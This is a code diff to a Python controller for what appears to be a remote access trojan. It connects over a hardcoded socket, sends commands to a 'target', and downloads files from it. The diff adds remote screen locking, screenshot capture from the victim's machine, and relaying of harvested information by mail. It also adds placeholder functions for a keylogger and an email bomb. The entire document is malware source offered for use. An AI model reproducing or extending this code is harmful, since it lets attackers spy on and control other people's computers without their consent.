@@ -3,7 +3,9 @@ import socket
 import os
 import time
 import sys
+import uuid
 from cryptography.fernet import Fernet
+
 
 HOST = "192.168.1.37"
 PORT = 6666
@@ -95,6 +97,31 @@ def send_file():
     strClientResponse = recv(BUFF).decode()
     print(strClientResponse)
 
+def lock():
+    send(b"lock")
+    strResponseSize = recv(BUFF).decode()
+    strResponse = recv(BUFF).decode()
+    print(strResponse)
+
+def shutdown():
+    pass
+
+def screenshot():
+    send(b"screenshot")
+    strSSSize = recv(BUFF).decode()
+    print(f"\n[+] Receiving Screenshot\n[+] File size: {strSSSize} bytes\n[+] Please wait...")
+    intBuffer = int(strSSSize)
+    strFileName = unique_name_creator()
+    ssData = recvall(intBuffer)
+    with open(strFileName, "wb") as f:
+        f.write(ssData)
+
+    print(f"[+] Done!\n[+] Total bytes received: {os.path.getsize(strFileName)} bytes")
+
+def unique_name_creator():
+    unique_name = str(uuid.uuid4()) + ".png"
+    return unique_name
+
 
 def receive_file():
     strFile = input("\nTarget file: ")
@@ -123,7 +150,17 @@ def receive_file():
     print(f"[+] Done!\n[+] Total bytes received: {os.path.getsize(strFileOutput)} bytes")
 
 
+def email_bomb():
+    pass
 
+def keylogger():
+    pass
+
+def receive_info_as_mail(tobesent):
+    send(tobesent)
+    responseSize = int(recv(BUFF).decode())
+    response = recv(BUFF).decode()
+    print(response)
 
 def run():
     while True:
@@ -135,6 +172,12 @@ def run():
             send_file()
         elif order[:8] == "download":
             receive_file()
+        elif order[:4] == "lock":
+            lock()
+        elif order == "screenshot":
+            screenshot()
+        elif order[:4] == "mail":
+            receive_info_as_mail(order.encode())
 
         elif len(order) > 0:
             send(order.encode())
